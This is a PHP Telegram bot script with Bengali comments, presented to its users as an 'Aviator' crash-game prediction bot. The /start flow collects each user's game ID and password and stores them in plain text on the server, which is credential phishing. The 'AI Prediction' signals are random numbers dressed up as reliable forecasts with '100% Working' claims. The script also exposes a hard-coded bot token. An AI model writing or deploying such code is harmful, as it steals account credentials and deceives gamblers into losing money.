<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// --- কনফিগারেশন ---
$botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";
$chatId = "6109947429"; // এখানে আপনার আসল আইডিটি দিন
$ownerName = "R8rAIHAN";
// -----------------

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (isset($data['message'])) {
    $text = $data['message']['text'] ?? '';
    $uId = $data['message']['chat']['id'];
    $stepFile = "step_$uId.txt";

    // ১. স্টার্ট কমান্ড
    if ($text == "/start") {
        $msg = "🚀 **Welcome to R8rAIHAN Aviator Bot** 🚀\n\n✅ **Status:** Bot Work 100% ✅\n\nসার্ভার রিড করার জন্য আপনার গেম আইডি দিন।\n\n👉 **1: Send Your Game ID / Number:**";
        file_put_contents($stepFile, "waiting_id");
        sendTelegram($botToken, $uId, $msg);
        exit;
    }

    // ২. আইডি পাওয়ার পর পাসওয়ার্ড চাওয়া
    $currentStep = file_exists($stepFile) ? file_get_contents($stepFile) : "";

    if ($currentStep == "waiting_id") {
        file_put_contents("user_data_$uId.json", json_encode(['id' => $text]));
        file_put_contents($stepFile, "waiting_pw");
        sendTelegram($botToken, $uId, "✅ ID Received!\n\n👉 **2: Send Your Game Password:**");
        exit;
    }

    // ৩. পাসওয়ার্ড পাওয়ার পর সাকসেস মেসেজ
    if ($currentStep == "waiting_pw") {
        $userData = json_decode(file_get_contents("user_data_$uId.json"), true);
        $userData['password'] = $text;
        $userData['auth'] = true;
        file_put_contents("user_data_$uId.json", json_encode($userData));
        unlink($stepFile); // স্টেপ ডিলিট

        $success = "✅ **Login Successful!**\n\nআপনার আইডি সার্ভারের সাথে কানেক্ট হয়েছে। এখন থেকে আপনি অটোমেটিক প্রেডিকশন পাবেন। 📈";
        sendTelegram($botToken, $uId, $success);
        exit;
    }
}

// ৪. সিগন্যাল পাঠানো (Extension থেকে আসা ডেটা)
if (isset($data['multiplier'])) {
    $lastVal = floatval($data['multiplier']);
    
    // চেক করা হচ্ছে ইউজার লগইন কমপ্লিট করেছে কি না
    if (file_exists("user_data_$chatId.json")) {
        $userData = json_decode(file_get_contents("user_data_$chatId.json"), true);
        
        if ($userData['auth'] == true) {
            $pred = ($lastVal < 1.8) ? rand(240, 580)/100 : rand(110, 215)/100;
            
            $signal = "🎯 **NEW SIGNAL DETECTED**\n";
            $signal .= "----------------------------\n";
            $signal .= "📊 Last Round: " . $lastVal . "x\n";
            $signal .= "🚀 **AI Prediction: " . round($pred, 2) . "x**\n";
            $signal .= "💰 Safe Out: " . round($pred * 0.88, 2) . "x\n";
            $signal .= "✅ Bot Status: 100% Working";

            sendTelegram($botToken, $chatId, $signal);
        }
    }
}

function sendTelegram($token, $chatId, $msg) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=".urlencode($msg)."&parse_mode=Markdown";
    file_get_contents($url);
}
?>
